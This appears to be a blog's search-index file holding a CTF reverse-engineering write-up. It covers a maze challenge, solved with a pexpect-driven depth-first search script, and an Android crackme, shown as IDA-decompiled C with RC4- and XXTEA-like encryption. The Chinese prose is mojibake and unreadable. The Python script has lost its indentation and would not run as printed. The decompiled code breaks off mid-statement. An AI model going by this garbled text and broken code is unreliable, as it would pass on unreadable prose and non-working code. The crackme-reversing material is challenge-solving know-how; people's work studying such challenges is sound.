<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2021å·…å³°æå®¢</title>
      <link href="/2021/08/01/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/"/>
      <url>/2021/08/01/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p>é€†å‘é¢˜è§£~<a id="more"></a></p><h3 id="baby-maze"><a href="#baby-maze" class="headerlink" title="baby_maze"></a>baby_maze</h3><p>å¸¸è§çš„è¿·å®«é¢˜ï¼Œä½†è€ƒæ³•å´ä¸å¸¸è§ï¼Œæ²¡æœ‰ç›´æ¥çš„åœ°å›¾ï¼Œåªæ˜¯ç»™å‡ºæ¯èµ°ä¸€æ­¥çš„ç¨‹åºçš„åé¦ˆï¼Œæç¤ºæ˜¯å¦é‡åˆ°éšœç¢ï¼Œæ˜¯å¦åˆ°å¯ä»¥é€šè¡Œï¼Œæ˜¯å¦åˆ°è¾¾ç»ˆç‚¹ã€‚</p><p>ç¨‹åºå°±æ˜¯é€šè¿‡æ¯èµ°ä¸€æ­¥ï¼Œè°ƒç”¨ä¸€ä¸ªå‡½æ•°ã€‚</p><p>æ„Ÿè§‰ä¸Šæ–¹æ³•å¾ˆå¤šçš„ï¼Œè¿™é‡Œæˆ‘æ˜¯é‡‡ç”¨ä¸ç¨‹åºäº¤äº’å†™ä¸€ä¸ªdfsæ¥è·‘ã€‚</p><p>é¦–å…ˆäº¤äº’é‡‡ç”¨çš„pexpectæ¨¡å—ï¼Œç„¶åæŠŠç¨‹åºä¸­æç¤ºæ­£ç¡®ä¿¡æ¯çš„å­—ç¬¦ä¸²éƒ½æ”¹ä¸ºï¼šâ€œ1\r\nâ€ï¼Œåˆ°è¾¾ç»ˆç‚¹çš„å­—ç¬¦ä¸²æ”¹ä¸ºäº†ï¼šâ€œ2\r\nâ€ï¼Œæ–¹ä¾¿åˆ¤æ–­äº¤äº’æ•°æ®ã€‚</p><p>å…¶æ¬¡å†™è¿™ä¸ªdfsæ¥ä¸ç¨‹åºäº¤äº’è·‘è¿·å®«å’Œå¸¸è§„çš„æœ‰åœ°å›¾è‡ªå·±è·‘è¦æ³¨æ„ä¸€ç‚¹ï¼Œ<strong>åœ¨æ¯æ¬¡èµ°ä¸€æ­¥åè¿”å›åˆ°ä¸Šä¸€å±‚çš„æ—¶å€™è¦åŠ ä¸€ä¸ªæ­¥éª¤ï¼šå¾€å›èµ°çš„æ­¥éª¤</strong>ï¼Œå› ä¸ºè¿™æ˜¯åœ¨ç¨‹åºäº¤äº’ã€‚</p><p>åˆšå¼€å§‹æˆ‘å†™è¿™ä¸ªè¿·å®«ï¼Œä»¥ä¸ºç¨‹åºå¯èƒ½å°±æ˜¯å‡ åæ­¥å§ï¼Œæ‰€ä»¥ä¹Ÿæ²¡æœ‰å»åšä»€ä¹ˆè¿‡æ»¤ï¼Œåé¢è·‘çš„æ—¶å€™å‘ç°æ­¥æ•°è¿œä¸æ­¢å‡ åï¼Œï¼Œèµ·ç ä¸Šç™¾ï¼Œè¯´æ˜è¿™ä¸ªåœ°å›¾æ˜¯å¾ˆå¤§çš„ï¼Œè¿™æ ·ç›´æ¥è·‘æ—¶é—´ä¸Šè‚¯å®šæ˜¯ä¸è¡Œçš„ã€‚ã€‚</p><p>æ¥ä¸‹æ¥æ”¹è¿›ï¼Œæƒ³åˆ°æˆ‘å¯ä»¥å¼€å§‹åˆå§‹åŒ–ä¸€ä¸ªå¤§çš„è¿·å®«ï¼Œè®©ç¨‹åºåœ¨è·‘çš„æ—¶å€™æ ¹æ®å›æ˜¾æ˜¯éšœç¢ç‰©æ¥åœ¨åˆå§‹åŒ–çš„è¿·å®«ä¸Šè®°å½•è¿™æ˜¯ä¸€ä¸ªéšœç¢ç‚¹ï¼ˆmaze[x][y] = 1ï¼‰ã€‚</p><p>æœ€åç¨‹åºåœ¨10åˆ†é’Ÿè·‘å‡ºäº†ç»“æœï¼Œå‹‰å¼ºèƒ½æ¥å—ï¼Œè™½ç„¶è¿˜æ˜¯å¾ˆæ…¢ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pexpect</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">next = [[<span class="number">0</span>, <span class="number">-1</span>], [<span class="number">1</span>, <span class="number">0</span>], [<span class="number">0</span>,<span class="number">1</span>], [<span class="number">-1</span>, <span class="number">0</span>]]</span><br><span class="line">d = <span class="string">"ASDW"</span></span><br><span class="line">flag = [<span class="number">0</span>]*<span class="number">1000</span></span><br><span class="line">back = &#123;<span class="string">'W'</span>:<span class="string">'S'</span>, <span class="string">'S'</span>:<span class="string">'W'</span>, <span class="string">'A'</span>:<span class="string">'D'</span>, <span class="string">'D'</span>:<span class="string">'A'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_str</span><span class="params">(ans)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">    s += i</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(step, x, y)</span>:</span></span><br><span class="line">print(do_str(flag))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line"><span class="comment">#print(do_str(flag))</span></span><br><span class="line">flag[step] = d[i]</span><br><span class="line">flag[step+<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">nx = x+next[i][<span class="number">0</span>]</span><br><span class="line">ny = y+next[i][<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> maze[nx][ny] == <span class="number">1</span> <span class="keyword">or</span> book[nx][ny] == <span class="number">1</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">r.sendline(d[i])</span><br><span class="line">ans = r.readline()</span><br><span class="line"><span class="comment">#print(ans)</span></span><br><span class="line"><span class="keyword">if</span> ans == <span class="string">b'1\r\n'</span>:</span><br><span class="line">book[nx][ny] = <span class="number">1</span></span><br><span class="line">dfs(step+<span class="number">1</span>, nx, ny)</span><br><span class="line">book[nx][ny] = <span class="number">0</span></span><br><span class="line">r.sendline(back[d[i]])</span><br><span class="line">r.readline()</span><br><span class="line"><span class="keyword">elif</span> ans == <span class="string">b'2\r\n'</span>:</span><br><span class="line">print(<span class="string">"found: "</span>, do_str(flag))</span><br><span class="line">t1 = time()</span><br><span class="line">print(<span class="string">"time: "</span>, t1-t)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">maze[nx][ny] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">t = time()</span><br><span class="line">maze=[[<span class="number">0</span>]*<span class="number">1000</span>]*<span class="number">1000</span></span><br><span class="line">book=[[<span class="number">0</span>]*<span class="number">1000</span>]*<span class="number">1000</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">book[i]=[<span class="number">0</span>]*<span class="number">1000</span></span><br><span class="line">r = pexpect.spawn(<span class="string">'./maze'</span>)</span><br><span class="line">r.readline()</span><br><span class="line">r.readline()</span><br><span class="line">ans = r.readline()</span><br><span class="line">print(ans)</span><br><span class="line">maze[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">maze[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">flag[<span class="number">0</span>] = <span class="string">'S'</span></span><br><span class="line">r.sendline(<span class="string">'S'</span>)</span><br><span class="line">ans = r.readline()</span><br><span class="line">dfs(<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">found:  SSSSSSSSSDDDDDDWWWWAAWWAAWWDDDDDDDDDDDDDDDDDDDDSSDDSSAASSSSAAAAWWAAWWWWAASSSSSSAASSDDSSSSDDWWWWDDSSDDDDWWDDDDDDWWAAAAWWDDDDWWAAWWWWDDSSDDSSSSSSSSSSDDDDSSAAAASSSSSSAASSSSAAWWAASSSSDDDDDDDDDDSSDDSSAASSSSAASSSSSSSSDDWWWWWWDDWWWWDDWWWWDDSSSSSSSSAASSSSDDDDSSDDDDWWDDSSDDSSDDDDDDDDSSDDSSSSDDDDSSDDSSSSSSDDSSSSDDDDSSSSDDDDDDSSSSDDSSDSSASSSSAASSDDSSAASSDDDDDDSSDDDDWWDDSSSSSSDDDDWWAAWWWWDDDDSSSSDDDDDDSSAASSSSSSDDDDDDDDSSDDDDSSSSSSDDWWDDDDDDSSSSSSSSAASSDDSSSSSSAASSDDS</span><br><span class="line">time:  655.1350808143616</span><br></pre></td></tr></table></figure><h3 id="medical-app"><a href="#medical-app" class="headerlink" title="medical_app"></a>medical_app</h3><p>ç®—æ˜¯å¾ˆå¸¸è§„çš„ä¸€ä¸ªå®‰å“é¢˜äº†ï¼Œå°±nativeå±‚é€»è¾‘å¾ˆæ˜æ˜¾çš„åŠ å¯†ã€‚</p><p>åšçš„æ—¶å€™å‘ç°è¿™ä¸ªä¸åŒæ¶æ„çš„soå»idaåç¼–è¯‘çš„ç»“æœåŒºåˆ«çœŸçš„å¤§ï¼Œï¼Œæ²¡æœ‰ç»éªŒï¼Œæˆ‘å¼€å§‹é€‰æ‹©äº†ç†Ÿæ‚‰çš„x86æ¶æ„çš„å»çœ‹ğŸ˜…ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> __<span class="function">cdecl <span class="title">Java_come_crack_crackme2_MainActivity_chk</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v13; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v15; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v16; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v21; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v22; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v23; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v24; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v25; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v27; <span class="comment">// [esp+8h] [ebp-264h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v28; <span class="comment">// [esp+Ch] [ebp-260h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v29; <span class="comment">// [esp+10h] [ebp-25Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// [esp+10h] [ebp-25Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v31; <span class="comment">// [esp+14h] [ebp-258h]</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [esp+14h] [ebp-258h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v33; <span class="comment">// [esp+18h] [ebp-254h]</span></span><br><span class="line">  <span class="keyword">int</span> v34; <span class="comment">// [esp+18h] [ebp-254h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v35; <span class="comment">// [esp+1Ch] [ebp-250h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v36; <span class="comment">// [esp+20h] [ebp-24Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v37; <span class="comment">// [esp+24h] [ebp-248h]</span></span><br><span class="line">  <span class="keyword">char</span> *v38; <span class="comment">// [esp+2Ch] [ebp-240h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v39; <span class="comment">// [esp+30h] [ebp-23Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v40; <span class="comment">// [esp+34h] [ebp-238h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v41; <span class="comment">// [esp+38h] [ebp-234h]</span></span><br><span class="line">  <span class="keyword">int</span> v42; <span class="comment">// [esp+40h] [ebp-22Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v43; <span class="comment">// [esp+4Ch] [ebp-220h]</span></span><br><span class="line">  _OWORD v44[<span class="number">16</span>]; <span class="comment">// [esp+50h] [ebp-21Ch]</span></span><br><span class="line">  _OWORD v45[<span class="number">17</span>]; <span class="comment">// [esp+150h] [ebp-11Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = (<span class="keyword">const</span> <span class="keyword">char</span> *)z(a1, a3);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(v3);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">36</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v38 = (<span class="keyword">char</span> *)v3;</span><br><span class="line">    v44[<span class="number">15</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">14</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">13</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">12</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">11</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">10</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">9</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">8</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">7</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">6</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">5</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">4</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">3</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">2</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">1</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">0</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">15</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">14</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">13</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">12</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">11</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">10</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">9</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">8</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">7</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">6</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">5</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">4</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">3</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">2</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">1</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">0</span>] = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *((_BYTE *)v44 + v5) = v5;</span><br><span class="line">      *((_BYTE *)v45 + v5) = *((_BYTE *)&amp;d + (v5 &amp; <span class="number">0xF</span>));</span><br><span class="line">      ++v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v5 != <span class="number">256</span> );</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    v7 = <span class="number">-256</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8 = *((<span class="keyword">unsigned</span> __int8 *)v45 + v7);</span><br><span class="line">      v9 = v8 + v6;</span><br><span class="line">      v10 = *((<span class="keyword">char</span> *)&amp;v45[<span class="number">16</span>] + v7);</span><br><span class="line">      v11 = v10 + v9 + <span class="number">255</span>;</span><br><span class="line">      v12 = v10 + v9;</span><br><span class="line">      <span class="keyword">if</span> ( v12 &gt;= <span class="number">0</span> )</span><br><span class="line">        v11 = v12;</span><br><span class="line">      v6 = v12 - (v11 &amp; <span class="number">0xFFFFFF00</span>);</span><br><span class="line">      *((_BYTE *)v45 + v7) = *((_BYTE *)v44 + v6);</span><br><span class="line">      *((_BYTE *)v44 + v6) = v8;</span><br><span class="line">      ++v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v7 );</span><br><span class="line">    v13 = <span class="number">0</span>;</span><br><span class="line">    v14 = <span class="number">-36</span>;</span><br><span class="line">    v15 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v16 = v13 + <span class="number">256</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">int</span>)(v13 + <span class="number">1</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">        v16 = v13 + <span class="number">1</span>;</span><br><span class="line">      v13 = v13 - (v16 &amp; <span class="number">0xFFFFFF00</span>) + <span class="number">1</span>;</span><br><span class="line">      v17 = *((<span class="keyword">unsigned</span> __int8 *)v44 + v13);</span><br><span class="line">      v18 = v15 + v17 + <span class="number">255</span>;</span><br><span class="line">      v19 = v17 + v15;</span><br><span class="line">      <span class="keyword">if</span> ( v19 &gt;= <span class="number">0</span> )</span><br><span class="line">        v18 = v19;</span><br><span class="line">      v15 = v19 - (v18 &amp; <span class="number">0xFFFFFF00</span>);</span><br><span class="line">      v20 = v14;</span><br><span class="line">      *((_BYTE *)v44 + v13) = *((_BYTE *)v44 + v15);</span><br><span class="line">      *((_BYTE *)v44 + v15) = v17;</span><br><span class="line">      v38[v14 + <span class="number">36</span>] ^= *((_BYTE *)v44 + (<span class="keyword">unsigned</span> __int8)(v17 + *((_BYTE *)v44 + v13)));</span><br><span class="line">      ++v14;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v20 != <span class="number">-1</span> );</span><br><span class="line">    v21 = *((_DWORD *)v38 + <span class="number">8</span>);</span><br><span class="line">    v37 = *(_DWORD *)v38;</span><br><span class="line">    v22 = *((_DWORD *)v38 + <span class="number">1</span>);</span><br><span class="line">    v27 = *((_DWORD *)v38 + <span class="number">3</span>);</span><br><span class="line">    v28 = *((_DWORD *)v38 + <span class="number">4</span>);</span><br><span class="line">    v31 = *((_DWORD *)v38 + <span class="number">5</span>);</span><br><span class="line">    v33 = *((_DWORD *)v38 + <span class="number">6</span>);</span><br><span class="line">    v39 = *((_DWORD *)v38 + <span class="number">2</span>);</span><br><span class="line">    v29 = *((_DWORD *)v38 + <span class="number">7</span>);</span><br><span class="line">    v43 = <span class="number">-11</span>;</span><br><span class="line">    v23 = <span class="number">-1621657930</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v40 = (v23 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">      v42 = *((_DWORD *)&amp;d + v40);</span><br><span class="line">      v37 += (((v21 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v22)) + ((v22 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v21))) ^ ((v23 ^ v22) + (v42 ^ v21));</span><br><span class="line">      v41 = v31;</span><br><span class="line">      v32 = *((_DWORD *)&amp;d + (v40 ^ <span class="number">1</span>));</span><br><span class="line">      v22 += (((v37 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v39)) + ((v39 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v37))) ^ ((v23 ^ v39) + (v37 ^ v32));</span><br><span class="line">      v36 = v33;</span><br><span class="line">      v34 = *((_DWORD *)&amp;d + (v40 ^ <span class="number">2</span>));</span><br><span class="line">      v24 = v39 + ((((v22 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v27)) + ((v27 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v22))) ^ ((v23 ^ v27) + (v22 ^ v34)));</span><br><span class="line">      v35 = v29;</span><br><span class="line">      v30 = *((_DWORD *)&amp;d + (v40 ^ <span class="number">3</span>));</span><br><span class="line">      v39 = v24;</span><br><span class="line">      v27 += (((v24 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v28)) + ((v28 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v24))) ^ ((v23 ^ v28) + (v24 ^ v30));</span><br><span class="line">      v25 = v28 + ((((v27 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v41)) + ((v41 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v27))) ^ ((v23 ^ v41) + (v27 ^ v42)));</span><br><span class="line">      v28 = v25;</span><br><span class="line">      v31 = v41 + ((((v25 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v36)) + ((v36 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v25))) ^ ((v23 ^ v36) + (v25 ^ v32)));</span><br><span class="line">      v33 = v36 + ((((v31 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v35)) + ((v35 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v31))) ^ ((v23 ^ v35) + (v31 ^ v34)));</span><br><span class="line">      v29 = v35 + ((((v33 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v21)) + ((v21 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v33))) ^ ((v23 ^ v21) + (v33 ^ v30)));</span><br><span class="line">      v21 += (((v29 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v37)) + ((v37 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v29))) ^ ((v23 ^ v37) + (v29 ^ v42));</span><br><span class="line">      v23 -= <span class="number">1621657930</span>;</span><br><span class="line">      ++v43;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v43 );</span><br><span class="line">    *((_DWORD *)v38 + <span class="number">1</span>) = v22;</span><br><span 